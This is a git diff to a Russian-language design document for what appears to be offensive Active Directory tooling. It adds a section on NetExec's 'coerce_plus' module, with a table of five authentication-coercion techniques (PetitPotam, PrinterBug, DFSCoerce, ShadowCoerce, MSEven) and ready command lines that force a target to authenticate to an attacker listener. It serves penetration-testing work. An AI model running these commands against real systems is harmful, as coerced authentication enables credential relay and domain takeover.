@@ -74,10 +74,40 @@
 
 `controller/nxc_ctrl.py` — универсальная обёртка для запуска эфемерных контейнеров NetExec:
 
-- **Coerce**: `nxc smb <target> -u '' -p '' -M coerce -o LISTENER=<callback>`
+- **Coerce**: `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<callback> [METHOD=PetitPotam|PrinterBug|DFSCoerce|ShadowCoerce|MSEven]`
 - **Post-Auth**: `nxc <protocol> <target> -u <user> -H <hash> [--shares | --users | -M <module>]`
 
 Каждый вызов — это `docker run --rm`, что гарантирует чистоту окружения и отсутствие состояния между запусками.
+
+### 2.4. Coercion через `nxc coerce_plus`
+
+Вместо устаревшего модуля `coerce` проект использует **`coerce_plus`** — единый nxc-модуль, объединяющий 5 техник принуждения к аутентификации:
+
+| Метод | RPC-интерфейс | Описание |
+|-------|--------------|----------|
+| `PetitPotam` | MS-EFSR | EfsRpcOpenFileRaw |
+| `PrinterBug` | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx |
+| `DFSCoerce` | MS-DFSNM | NetrDfsAddStdRoot / NetrDfsRemoveStdRoot |
+| `ShadowCoerce` | MS-FSRVP | IsPathSupported / IsPathShadowCopied |
+| `MSEven` | MS-EVEN | ElfrOpenBELW |
+
+**Основные режимы работы:**
+
+```bash
+# Сканирование (LISTENER=localhost, без сетевого трафика)
+nxc smb <target> -u '' -p '' -M coerce_plus
+
+# Coerce с callback к нашему listener
+nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
+
+# Конкретный метод
+nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> METHOD=PetitPotam
+
+# Все методы подряд, даже если один уже сработал
+nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
+```
+
+В конфиге проекта (`config.yaml`) задаётся список `coerce.methods` и флаг `coerce.always`. Если указать `coerce_plus` или `all` — nxc сама переберёт все доступные методы.
 
 ---
 
